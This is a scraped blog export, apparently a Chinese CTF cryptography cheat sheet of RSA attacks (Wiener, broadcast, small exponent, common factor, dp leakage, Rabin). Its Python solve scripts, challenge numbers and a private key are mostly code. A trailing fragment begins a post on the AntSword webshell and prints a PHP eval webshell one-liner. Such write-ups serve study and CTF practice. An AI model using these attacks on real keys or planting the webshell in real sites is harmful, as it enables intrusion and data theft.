opensslOpenSSL&gt; rsa -pubin -text -modulus -in /Users/apple/Downloads/mediumRSA/pubkey.pemPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----OpenSSL&gt; 可以看到： 123N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDE=65537 生成私钥 123456789101112131415161718192021222324import mathimport sysfrom Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 275127860351348928173285174381581152299keypair.q = 319576316814478949870590164193048041239keypair.e = 65537keypair.n = keypair.p * keypair.qQn = int((keypair.p-1) * (keypair.q-1))i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&#x27;private.pem&#x27;,&#x27;wb&#x27;)private.write(keypair.exportKey())private.close() 生成FLAG 1OpenSSL&gt; rsautl -decrypt -in &#x2F;root&#x2F;flag.enc -inkey &#x2F;root&#x2F;private.pem 脚本123456from Crypto.PublicKey import RSApublic=RSA.importKey(open(&#x27;/Users/apple/Downloads/mediumRSA/pubkey.pem&#x27;).read())n=public.ne=public.eprint(n)print(e) 题型一知道公钥(pubkey.pem)和密文(flag.enc) openssl求出e、n，破解生成 12345678910111213141516python2或者3import libnum from Crypto.Util.number import long_to_bytes n = 87924348264132406875276140514499937145050893665602592992418171647042491658461 p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) with open(&#x27;/Users/apple/Desktop/flag.enc&#x27;) as f: c = f.read().encode(&#x27;hex&#x27;) c = int(c,16) m = pow(c,d,n) print long_to_bytes(m) 关于文件形式的密文c，一般都是16进制形式读取，接着再转为整型用于计算。 题型二两个文件public.key和flag.enc 1234567891011121314import libnumimport Crypto.PublicKey.RSAimport Crypto.Cipher.PKCS1_OAEPfrom Crypto.Util.number import long_to_bytes n = 10306247299477991196335954707897189353577589618180446614762218980226685668311143526740800444344046158260556585833057716406703213966249956775927205061731821632025483608182881492214855240841820024816859031176291364212054293818204399157346955465232586109199762630150640804366966946066155685218609638749171632685073 p = 97 q = 106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) key=Crypto.PublicKey.RSA.construct(map(long,[n,e,d]))rsakey=Crypto.Cipher.PKCS1_OAEP.new(key) 唯独密文攻击唯密文攻击指的是在仅知已加密文字的情况下进行穷举攻击，把加法密码和乘法密码联合起来，就得到了所谓的仿射密码(affinecipher)—— 两种密码与一对密钥的组合。 思路：计算q=n/p,对比找出小的那个质数，找到n与200组密文的最大公约数即相当于对n做了分解。 12345678910111213141516171819202122232425import rewith open(&#x27;ciphertext.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines() e = [] for line in content: res = re.findall(&#x27;^\\d+&#x27;, line) if len(res) &gt; 0: e.append(int(res[0]))n = 135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379def divisors(m, n): c = 1 while c != 0: c = m % n m = n n = c return mif __name__ == &#x27;__main__&#x27;: for i in range(len(e)): print(str(i + 1) + &#x27;:&#x27; + str(divisors(n, e[i]))) 低加密指数分解攻击前提： e=2、密文已知。 1234567import gmpy2 import libnum c = 9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529 m = gmpy2.isqrt(c) m = int(m) m_text = libnum.n2s(m) print(m_text) 前提： e=2 Rabin加密中的N可被分解。 p y12345678910111213141516171819import gmpy2 import libnum e = 2 n = 87924348264132406875276140514499937145050893665602592992418171647042491658461 p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 c=int(open(&#x27;/Users/apple/Downloads/hardRSA/flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16) mp=pow(c,(p+1)/4,p) mq=pow(c,(q+1)/4,q) yp=gmpy2.invert(p,q) yq=gmpy2.invert(q,p) r=(yp*p*mq+yq*q*mp)%n rr=n-r s=(yp*p*mq-yq*q*mp)%n ss=n-s print libnum.n2s(r) print libnum.n2s(rr) print libnum.n2s(s) print libnum.n2s(ss) 小明文攻击前提： e较小，一般为3。 12345678910111213141516171819202122#适用情况:e较小,一般为3#公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。 import gmpy2import binasciiimport libnumimport timefrom Crypto.Util.number import long_to_bytesn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 e=3 res=0 #res是m c=int(open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16) print time.asctime() for k in xrange(200000000): if gmpy2.iroot(c+n*k,3)[1]==1: res=gmpy2.iroot(c+n*k,3)[0] print k,res print long_to_bytes(res) print time.asctime() break 模不互素前提： 存在两个或更多模数 ，且gcd(N1,N2)!=1 也就是N1和N2不互质。 判断是否互为素数 1234567891011121314def gcd(a,b): if(b==0): return a else: return gcd(b,a%b)def main(): x = 20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951 y = 18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727 if gcd(x,y)==1: print 1 else: print 0if __name__==&quot;__main__&quot;: main() 1234567891011121314151617import gmpy2 from Crypto.Util.number import long_to_bytes lines = open(&#x27;tmp.txt&#x27;,&#x27;r&#x27;).readlines() c1 = int(lines[2],16) c2 = int(lines[6],16) n1 = int(lines[0]) n2 = int(lines[4]) p1 = gmpy2.gcd(n1, n2) assert (p1 != 1) p2 = n1 / p1 p3 = n2 / p1 e = 0x10001 d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1)) d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1)) m1 = pow(c1, d1, n1) m2 = pow(c2, d2, n2) print long_to_bytes(m1)+long_to_bytes(m2) 数据放在文本中–严格遵守c为十六进制。e is 655370x15b9bfc47ff3791eee8d13760c676bf6c17b357e663cbf898d5ebb5de19d1ef2b56346ed1e471e014749d63e1d645a1150d0d29cb7a3346841e600b9488ab189d57fd8b31e268e9d0ad9ae173d9c68ab7880e6583adc770d72f33a71c9f2b4c1c039834b4cae08735925e4f04b658b302fc401df629eedc7d0f79108f2bddea08606380977a5434f20725319573d2db76a2909ebe565211cff605aa001922e0cc53b4430f08e352f9ddc6ae144c48cd3494942189330d45dbf0c2fb3356dd54d6140f1169975454fc8ccedb3b8847967165911d94b7577b68215cbee6ee244a68086d080663ebeb3c8cc7c46aaa13a73d88fe3350f9c627b56a31d5da8f5b7be is 655370xce4647358e97f5ec92edc325b703996160ec041c056cd0a9e7b3b00f66a431277ef35277671233137929c8325e60f6c60a6399bcecf8b454c7865a56857723364c6c172c462fc6ab03a590882d82ac57d1f5483466b3010f14091a31ca470da5872e2e944918d8142fc0896cb386ca47592d56b63fcb7addbcc6218d676ff6305e1ee79a71eacb6cf84a022e1993500c4f45c72691cc6d4db60d75f9fa95a770e840ffcfc3d058644a054ba265cbde13c41d197cb8cf8235e67046845cd4ecbbf5ec37443a74252aee386fae320a12b2284fabaa0c8af346fde3bfa1b7933fd9f1b673ea0675ec0039c192ee53ae3b06494ecb92f7e44f8b5cfdf6d2bfb42af 低解密指数攻击(e过大、过小)前提： e过大或过小（一般e过大时使用） 1234567891011121314151617181920212223242526272829import gmpy2from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticfrom Crypto.Util.number import long_to_bytes def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsedef main(): n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 d = wiener_hack(e, n) m = pow(c,d,n) print long_to_bytes(m)if __name__==&quot;__main__&quot;: main() 123➜ rsa-wiener-attack-master python steady.pyHacked!flag&#123;Wien3r_4tt@ck_1s_3AsY&#125; 私钥文件修复openssl提取公钥信息，将Modulus替换到脚本中。 私钥文件修复 https://github.com/Zui-Qing-Feng/RSA/blob/master/%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D 生成私钥内容然后跑脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051-----BEGIN RSA PRIVATE KEY-----MIIJKAIBAAKCAgEAwJd4U0VkhH2MxLQg6TNYZ+x4Pmz18FygPu7cJWPQ6yqeuo8ZUqJnC+dusjS4bVB24GrRA893M9ix6dc75escZQwllv2WILl63h2&#x2F;&#x2F;fK2v4E+PkdEQ5i&#x2F;ZS9nfid1+VZHusTwTmcr2uAadxRAKcGoZ1qP9S6+joIxPUMm1JeGKRUUqWk2LHbttZDr7G&#x2F;O1cokHKr2Y&#x2F;gGomLLJnTTW4JLttXgSTJ7YvgFxPcOhlmb8xclAqo8l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk4eRM+OmtJcfgwBW7tGdIkAObIH8MF+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJWYH6iE9ZYGuEhK3ZxyWM6MDo9yaeN5V84UgpD1HnvZgv9syA5&#x2F;AyC4lRkk7CbVBTKzt3ctG9Gh+S1xJ5YWHFpH6zhevwfG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj3IyDC6Iq1TxBSEFUGqnotnC&#x2F;0&#x2F;7tGRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1&#x2F;ALpRlXVpNPnxjB3+XPpRFLYE51dv576OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQAB6sIZehln1rFflsyTR&#x2F;cNedLdFISoFx+BLdMrpkMWAIJksJIgODkBd&#x2F;86dyV7+JbeTXQCSLe73fM8D&#x2F;MC7obB0CAwEAAQKCAgAuZ5DPh6XboqC7eKeBaSTBDaI&#x2F;cGOmAbt+znDu9WkOcNuEGhzA426u2Jm8iKVzeXLbSgGIyIFxVaIwtPKyyH6z&#x2F;kREaF+3DNoFEOgE2WmdJRgJS4SwQOrFB7IJHJr5dAeegftg+M0BVQQrcw6uwQHBvXl4W0YA8m&#x2F;I0hhWGxhxZ6nt0&#x2F;MArbtDB2NBOgN9UdJ3sd3iYo2+rM1EO9v9bZyutkPvfyFpzFcfiWPPjWHdJdN+G+Szno9VVUmxKDZWE+moY96a6HH409juattxnLZgU3EUfMGCm&#x2F;GUdugeZNCAGs5S+ym&#x2F;zb6wONigQlomoldnWHVI66flir8++RALcUFWC46IH2FyrAJfWR+c8E5ns8Z+HlnZFFO+z2i&#x2F;xWWc9jqFMqDq0yQccqLUWFqPDVINClfIu7bUoM7QLuEKohdkyTwbcx9zOqVuNg7d18g+Qrm3Ru+uD0ni85mnwWA3kZPdQ6pvJaEDJzRPp0rpZyjEP4p2FtXDbp7I1gy9qH834mmrcH2R5RANmJZFIb0T49beAqF7B3wO0AfCpUj1D827JRKCww1OLv02FVALNPjcf7aIfecFAHTOc56NOwLdB7MvPw4O5LtUaLTHMUxZ1CIzB&#x2F;Ks4P9Yn7O0du9nFxPmYPWCYoXJX+DFOqc3U4atY6bTs2z6QLs6cdPQrltEXeYFRQKCAQEA7iHlusjDSIy9vtxsYzr2qz6CqMUrd8FtaeYf2SCGXHEGfDlYCVNbS0dktyAkZ27mZxAovKzRhRwB04PxtNNboTPdo5iDbqC8J8Kxvz6W6TeCjZLDEyoOunrYdE8SyK&#x2F;1tX7oCrbe+8Xk3pE5RzypwNZbp7V9gQsjJxe6oZlkRTXEGgJDJ5mV+v29ngoNki+zMhTk6emubf23cSmT+f7cw5Cs5+jgaCMrYliciLaejF869+JCcZm2Kj7eCP0lDJ9HMVa+v79nKPeDyvdj680KMNv3RQhVjfavMsoIriIDfKczduzBdtylgBkLsqozoqmhyL&#x2F;MuAY31VwCrLXipyWIzwKCAQEAzwrQ0VVkMYZ7xIxCnv004&#x2F;DyDePSOJkU2ToMaE0Bcf+ypEEu&#x2F;KjW8aU6TKPNWHnAcCL0nzozoZcYNJyrI195DXiT8wXSaL2uR2gum+E71ov85MdIz+z9NTqXJsvRjy5w399n&#x2F;O+g+XeIObAMGi+&#x2F;UdLYLgquPVa7Pd37sPt69Cf1H7TZx9y6+nXH1iCLa5LQm0pgedaQTxbR9EtY&#x2F;Fj2vIc4I5JxduGb3kFm7D3Sc6NqP354hJnmO&#x2F;diiCjxLhVqHiiPuIrmAOSZ4X4VRWOkPMylKoFkx3HxqW1Zkq&#x2F;Hk&#x2F;msjM8IUHBtSKd6Vh3&#x2F;&#x2F;NYUq2SCt2Dys95f6YlonhQfUwKCAQEAwypk7cC8zCkNGe&#x2F;tpSYeJBsHWuq9xVhyI+jHEVzmwbygZA9bZ8k5eWj50lw1edAaZT2JJZk93qollQT+hAT1hBjN&#x2F;dZxYam6i5u1sdfKNzmXdhBicMJ3b75eyHRGINSVvDpWUvGtrwtxmDfNieTd+32zgK&#x2F;uPGS0WsXH38mntFFsdySDhWEK2ro7PdtfZABUDSeytUMgAmV+gvBgpvOKW32nOCpUQQUR+XhGUoXZS5KA8cguTIx+EAGWWCegxceEwZsmmmB0W87&#x2F;5Mj8y7UwNPsSnTFHbSJQVH&#x2F;gvVaDJRajx0QjCxerTGE6hSOZTidYwP7w+aGfAO54ArTPHc5VYQKCAQBVC3RLCHBnh34&#x2F;df3HoOqg1tAWtIYdiYPu1tFR5o+5a&#x2F;bNUZkjX5crG1ufL4mh1iEd7r3cyeN7dL0Un2YM2aK3zde386RCMefsnPbIQPR7ZHU05EccYZSA0NhVr1MdJU5oJzRnyWauElN6nr3Z49MKoTj7cJexynaPKye&#x2F;wwz2TZN6uqbaWejUCJ1Vb3jVbzERGLQYV&#x2F;JfClijqG+c+E4hksmUkwrYckO8P9EvKRXROkbiXejTTwQrjaqDk42+CD3WtYKTozpnE3&#x2F;CCDBkmFFWSBlwJEZpRnylw60Pe&#x2F;TW66&#x2F;dBw27PPMm7ORri1cjXCyRWm&#x2F;3M3N+PtHW9AJtLIbRAoIBABgyTrVuAjXd7qO57px&#x2F;XHtUXvgXudo7XstJ9DYLE4roLEj8zUYDFS9KmGjANcmBpcgbKagWN9SqDQSfo8WkEoAue74n7+8goDbeh0YQ2y0mDmpP34dBwF79USn3O+2lVI+1HXUTfTxOTmLPo5bSsv38HL2t3Ll6cUCg&#x2F;&#x2F;M7IAQbpRME3z8gIe0&#x2F;HNWkZjyRadnBsk1QbEmZ8fBtiEp2LHFjnJLASiU+f38+cqqUFcrGBlNvc&#x2F;7W0SB2a5rp81XRwBGXEGtt+fYlBCWIuHVEih9qFqnP6VAeL6lKMzIpH1rbIrwFoIpMzyrnAjZGOJZ6bBcbgMFtNLBmJMSlmuSIao8&#x3D;-----END RSA PRIVATE KEY----- 1234567891011121314from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP with open(&#x27;/Users/apple/Downloads/godlikeRSA/pubkey.pem&#x27;, &#x27;r&#x27;) as f: key = RSA.importKey(f) N = key.n e = key.e print N print e with open(&#x27;/Users/apple/Downloads/godlikeRSA/1.pem&#x27;, &#x27;r&#x27;) as f: private = RSA.importKey(f) oaep = PKCS1_OAEP.new(private) with open(&#x27;/Users/apple/Downloads/godlikeRSA/flag.enc&#x27;, &#x27;r&#x27;) as f: print oaep.decrypt(f.read()) 低加密指数广播攻击前提： 模数n、密文c不同，明文m、加密指数e相同。 12345678910111213141516171819202122232425262728293031323334353637383940import randomfrom gmpy2 import invert, irootdef broadcast(n1, n2 ,n3, c1, c2, c3): n = [n1, n2, n3] C = [c1, c2, c3] N = 1 for i in n: N *= i Ni = [] for i in n: Ni.append(N / i) T = [] for i in xrange(3): T.append(long(invert(Ni[i], n[i]))) X = 0 for i in xrange(3): X += C[i] * Ni[i] * T[i] m3 = X % N m = iroot(m3, 3) return m[0]def main(): e = 3 c1 = 0x9e84763bdbe246fad0a9cd52fda6233e6128a6210efaf3e6dea4fe272f78ad1f8f5cc7022f62f4f542341128e42d6fd10e67c5f96edbd243917c0151289f7228e44019b8c65a541d7306b398465e26b69cab36cc61e4ac094832b4299bbaf4630b722a0fb4f1997053be97e926f94afb55a0bb6ef00ab694e2f595d9eb8ca96c49f5cbbe194529f68a1aaf6f5151484b471285ba8fc8cd30b55612f35a74dc68e255c363579a80d27ce5090873ac719ba59f2492c91fd28bcce26b6a02bae005cbbd2a4cfe5b93442be8664d2313d412e7e09f545c64b7b74bbc408b6e574d0d300135cba8d6c1d73737d59baca9992ede644d856eb4cfcda562a75743e4b491 c2 = 0x9817fdc7b31a8f9cde1794096d3aa2bc6fe06fe34d4b7c9ca9a77982adf67fd4a7e636659553f4168a16757dc3a75e54ff850b9a94a5270f4f75502c7055a3a389df2ea6b00784a4e78e66901b427253c0f343f127e0ff162a349bb14eb4c1453fc6daace19bba4940d77c435686ef3b59f732072cde2e148d1a64f9682b3f1ceb9a000d87e180a1f9eb20c59dbebc13ddb2e07b64db89217f40369aeec878a45d99909ab2a3e4cdb74aa68890c941315ae289d6667200c53f9a32c8a64bfc74e62898ac03c460f945a13f11ee28860a3cd07526c30aa92eb89442a76549fe4ed8a43d14fdeeb350e90443a3a586db719f8610eb5d4a8f5bd1e481b5ef6e96ef c3 = 0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0 n1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555 n2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867 n3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303 m = broadcast(n1, n2 ,n3, c1, c2, c3) print mif __name__==&quot;__main__&quot;: main() 1234567891011121314151617181920import gmpy2import timedef CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N / n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(&quot;Input not pairwise co-prime&quot;) result += a * s * m return result % N, Ne = 3n = [8564529398597496052509875513481234511905571293608253591774352345237876733293108831203723008958367224489489969614656703455962549261315442327443089652074571708651505447379309166100331065440172781968875497386410667715026180057913363208450111095566219238303387888025161407043477291378931412269049849744457547932264137377411127192940332805452317547219248055802197050456726624516860024108642571703812719370387292166670300197241575461417648592309869669813374010765766544607691011957968652581504886331252936146901456910589102484807039294566703917033093028140452849747910537865958098720693569821256189593894121111357731919189L,12222166297277342805260668042066733749258843622057497574551492680820573970618063356710810891221670366396148862070530068431772630271300064517141331380959413811482890080103511756363920299387620181525172247384085449944650678616398890947062703879307721506228672839270493453501648644787019360131991056158375296484870723717496184332078521221915234959627683952251865227849249752415242124235776428944052873501045127442031423538183282845800971359590735184850648986263721823804859410866927117413289461014754456802566932965710529063515405296476007642849800772934170961993925017146017197762805148533435040675962332469643915192423L,5057224034499776793532654516178914954537547410664409403680432108569079856741764362023185604595829263918927121465578691201904227912897025244771553860102714429349163283510695391193774853323951653123109509215361937850724934183826508070404239791710229214063382081391564954935544392514769166830815475459218792639383796711824752291158895292103354274632470559179266550681095452239666165213986993496109747058314685303485222302144835490056402939133225003233112131275635419321982899965440912525225759368684717157077161771778903529280898069381899400305195745292409238361901176051346615633641550303346790420492393767770845418243L]c = [20010971557789931948130798983030201950038450269144104532821030667924400788869920238579729514672630221804096063149106742412869966814701225466606392171030411339119559280790040322081104363393453503417465768386174002015870794567148694722215873094298859132439253412531445187990845476275251348800166731481176155530755581153710085966976765505591809596417849783597055650440598035159288091495453205698044687869932756053447012994409598155552263807571713982758132066319612777306466708222135510918174055647735727504029507503430288609410745159037684948343055275573269067165460711584845480188706531450367147105629493736100726092945L,19200052919818196558567528701224082155105852846109782021681848107226495293687021416871117444987923837810238872836818190457667509409714021669160815809413653880491792640346474248859559867743715715552372738909255050196638006472279364316678941257894898953088366861786500472095752890593521428325838148184891778283229870316694059734109045397448347320487605412988229047015174998893589731503114337273121463601984792339337970193596813660178636222764332155999993506914518600565394196792457144962180040786607335687020278442899146954126853580244264273526509238060494624980807993322975135366653181977147866567146492356137019414255L,1394721540127922627584993749596603212491913755865039994631041458882716953251760080638497574652888386411767951258467542002582418260315909190241131591474627765734174146981015346732559115044918706641616288474447294129332475081232268241201488455865700933615291016346552048997127415783072860387265063527874160016186183078384940312292521628077750464413013768765371508493304331719166196330883242895556903378707199640686499970367957552543041110199009425369612644492288765891769004579050802446992426813215932250347386859783813875543314196764160792696291742850356532493945652482643696238487389412404616537620013009141601852080L]data = zip(c, n)x, n = CRT(data)m = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()print m 已知dp,dq求解m123456789101112131415import gmpy2 from Crypto.Util.number import long_to_bytes c = xxx p = xxx q = xxx dp = xxx dq = xxx InvQ=gmpy2.invert(q,p) mp=pow(c,dp,p) mq=pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print long_to_bytes(m) CopperSmith定理攻击前提： 若e较小，并且已知m的高位，则可通过此方法求出完整的m。 m=0x65c46754a7776c8b88867e000000000000000000 前面的部分就是高位，后面的0就是低位，0只是占位的作用并不是真正m的值。 已知e,n,dp,c求m1234567891011121314151617import gmpy2import libnumfrom Crypto.Util.number import long_to_bytese= 65537n = 9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901c = 5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827dp = 81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi m = pow(c,d,n) print long_to_bytes(m) N分解出多个不同的因子前提： 题目给出的模数N可直接分解，但是分解之后得到了多个不同的因子。 12345678910111213import gmpy2from Crypto.Util.number import long_to_bytesn= 544187306850902797629107353619267427694837163600853983242783e= 39293c= 439254895818320413408827022398053685867343267971712332011972p1 = 67724172605733871p2 = 11571390939636959887p3 = 694415063702720454699679phi = (p1-1)*(p2-1)*(p3-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print long_to_bytes(m)","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF密码","slug":"CTF密码","permalink":"http://s1eady.top/tags/CTF%E5%AF%86%E7%A0%81/"}]},{"title":"蚁剑的工作原理","slug":"蚁剑使用--Bypass Waf","date":"2018-11-07T19:28:56.000Z","updated":"2020-10-16T11:44:15.754Z","comments":true,"path":"2018/11/08/蚁剑使用--Bypass Waf/","link":"","permalink":"http://s1eady.top/2018/11/08/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8--Bypass%20Waf/","excerpt":"","text":"蚁剑的工作原理连接shell一句话shell 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt; 蚁剑会发送post包，给cmd参数传递不同操作对应的php代码，比如连接shell的时候传递 